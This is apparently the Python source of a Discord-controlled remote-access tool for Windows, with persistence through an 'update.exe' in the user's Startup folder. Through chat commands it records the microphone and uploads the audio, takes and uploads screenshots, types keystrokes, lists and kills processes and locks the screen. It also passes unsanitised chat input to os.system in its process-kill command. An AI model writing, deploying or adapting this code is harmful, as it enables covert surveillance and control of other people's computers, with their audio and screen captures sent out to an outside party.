
from PIL import ImageGrab, Image, ImageTk
import os 
import discord
import asyncio
import getpass
import requests
import pyautogui
from gtts import gTTS 
import pygame
import time
from threading import Thread
import tkinter as tk
from tkinter import messagebox
from dotenv import load_dotenv 
import cv2
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
import ctypes

load_dotenv()

path1 = "C:/users/"
path2 = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/update.exe"
path=(path1 + getpass.getuser() + path2)
print(str(path))


token = os.getenv("Cody")
timeout = 1
connection = False
def wifi_check():
    try:
        requests.head("http://www.google.com/", timeout=timeout)
        # Connection Success
        print('The internet connection is active')
        connection = True
    except requests.ConnectionError:
        # Connection Retry
        print("The internet connection is down")
        connection = False
        time.sleep(1)
        wifi_check()

wifi_check()

class MyClient(discord.Client):
    async def on_ready(self):
        #announce logon
        print(f'Logged on as {self.user}!') ,
    async def on_message(self, message):
        try:
            if f'{message.content}' == 'rec':
                await message.channel.send('Recording...')
                os.system('ffmpeg -f dshow -i audio="Microphone Array (Realtek(R) Audio)" -t 30 output.wav')
                await message.channel.send(file=discord.File('output.wav'))
                os.remove('output.wav')

            if f'{message.content}' == 'upd':

                await message.channel.send('Updating...')
                os.startfile(str(path))
                quit()

            if f'{message.content}' == 'scr':
                # Take screenshot
                im = ImageGrab.grab()
                im.save('screenshot.png')
                await message.channel.send(file=discord.File('screenshot.png'))
                os.remove('screenshot.png')

            if f'{message.content}' == 'tts':
                # Check if the message is from the bot itself
                if message.author == self.user:
                    return 
                # Wait for reply containing the user defined message in discord
                await message.channel.send('Please enter the message you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)      

                async def Playsound():
                    # Play the notification and message contents
                    message_content = (msg.content)
                    player = gTTS(text=message_content, lang='en', slow=False) 
                    player.save("msg.mp3")
                    pygame.mixer.init()
                    pygame.mixer.music.load("msg.mp3")
                    pygame.mixer.music.play()
                    while pygame.mixer.music.get_busy():
                        await asyncio.sleep(0.1)
                    pygame.mixer.music.unload()  # Unload the music to release the file
                    os.remove("msg.mp3")

                await Playsound()

            if f'{message.content}' == 'msg':  
                #wait for reply containing the user defined message in discord
                await message.channel.send('Please enter the message you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)

                def Dialog_Box():
                    message_content = (msg.content)
                    root = tk.Tk()
                    root.withdraw()  # Hide the root window
                    root.attributes('-topmost', True)  # Always on top
                    messagebox.showinfo(str(message.author.name), message_content)
                    root.destroy()
                #open dialog box
                t2 = Thread(target=Dialog_Box)
                t2.start()
                t2.join()

            if f'{message.content}' == 'lock': 
                # Lock the screen
                os.system("rundll32.exe user32.dll,LockWorkStation")
                await message.channel.send('Screen Locked')

            if f'{message.content}' == 'key':
                await message.channel.send('Please enter the keystrokes you would like to send')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)
                pyautogui.typewrite(msg.content)
                await message.channel.send('Keystrokes sent')

            if f'{message.content}' == 'close':
                #send a list of proccesses to discord chat
                os.system('tasklist > tasklist.txt')
                await message.channel.send(file=discord.File('tasklist.txt'))
                os.remove('tasklist.txt')
                await message.channel.send('Please enter the process you would like to close')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)
                await message.channel.send(f'Closing {msg.content}')
                os.system(f'taskkill /f /im {msg.content}')
            
            if f'{message.content}' == 'img':
                 await message.channel.send('Please upload the image you would like to display')
                 def check(m):
                     return m.author == message.author and m.channel == message.channel and m.attachments
                 msg = await client.wait_for('message', check=check)
                 attachment = msg.attachments[0]
                 await attachment.save('temp_image.png')

                 def show_image():
                     print("Creating tkinter window")
                     root = tk.Tk()
                     root.attributes('-topmost', True)  # Always on top
                     img = Image.open('temp_image.png')
                     img = ImageTk.PhotoImage(img)
                     panel = tk.Label(root, image=img)
                     panel.pack(side="top", fill="both", expand="yes")
                     root.after(500, lambda: root.destroy())  # Close the window after 3 seconds
                     print("Displaying image")
                     root.mainloop()
                     print("Image displayed and window closed")

                 print("Calling show_image()")
                 show_image()
                 print("Image should have been displayed")
                 os.remove('temp_image.png')
                
            if f'{message.content}' == 'vid':
                await message.channel.send('Please upload the video you would like to display')
                def check(m):
                    return m.author == message.author and m.channel == message.channel and m.attachments
                msg = await client.wait_for('message', check=check)
                attachment = msg.attachments[0]
                await attachment.save('temp_video.mp4')

                def show_video():
                    print("Creating tkinter window")
                    root = tk.Tk()
                    root.attributes('-topmost', True)  # Always on top
                    video_label = tk.Label(root)
                    video_label.pack(side="top", fill="both", expand="yes")

                    def stream_video():
                        video = cv2.VideoCapture('temp_video.mp4')

                        while video.isOpened():
                            ret, frame = video.read()
                            if not ret:
                                break
                            img = ImageTk.PhotoImage(Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)))
                            video_label.config(image=img)
                            video_label.image = img
                            root.update_idletasks()
                            time.sleep(1 / video.get(cv2.CAP_PROP_FPS))

                        video.release()

                    Thread(target=stream_video).start()
                    root.mainloop()
                    print("Video displayed and window closed")

                print("Calling show_video()")
                show_video()
                print("Video should have been displayed")
                
                os.remove('temp_video.mp4')
            #play a user defined sound on host machine
            if f'{message.content}' == 'sound':
                await message.channel.send('Please upload the sound you would like to play')
                def check(m):
                    return m.author == message.author and m.channel == message.channel and m.attachments
                msg = await client.wait_for('message', check=check)
                attachment = msg.attachments[0]
                await attachment.save('temp_sound.mp3')

                async def play_sound():
                    pygame.mixer.init()
                    pygame.mixer.music.load('temp_sound.mp3')
                    pygame.mixer.music.play()
                    while pygame.mixer.music.get_busy():
                        await asyncio.sleep(0.1)
                    pygame.mixer.music.unload()  # Unload the music to release the file
                    os.remove('temp_sound.mp3')

                await play_sound()
            #change volume
            if f'{message.content}' == 'vol':
                await message.channel.send('Please enter the volume you would like to set (0-100)')
                def check(m):
                    return m.author == message.author and m.channel == message.channel
                msg = await client.wait_for('message', check=check)
                volume = float(msg.content) / 100.0  # Convert to a value between 0.0 and 1.0

                devices = AudioUtilities.GetSpeakers()
                interface = devices.Activate(
                    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                volume_interface = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
                volume_interface.SetMasterVolumeLevelScalar(volume, None)

                await message.channel.send(f'Volume set to {msg.content}%')

            if f'{message.content}' == 'help':
                help_message = (
                    "Available commands:\n"
                    "rec - Record audio for 30 seconds\n"
                    "upd - Update the application\n"
                    "scr - Take a screenshot\n"
                    "tts - Text-to-speech\n"
                    "msg - Display a message box\n"
                    "lock - Lock the screen\n"
                    "key - Send keystrokes\n"
                    "close - Close a process\n"
                    "img - Display an image\n"
                    "vid - Display a video\n"
                    "sound - Play a sound\n"
                    "vol - Set the volume\n"
                    "min - Minimize all windows\n"
                )
                await message.channel.send(help_message)
            #press win + d
            if f'{message.content}' == 'min':
                pyautogui.hotkey('win', 'd')
                await message.channel.send('Minimized all windows')

        except Exception as e:
            await message.channel.send(f'An error occurred: {str(e)}')



intents = discord.Intents.default()
intents.message_content = True
client = MyClient(intents=intents)
client.run(str(token))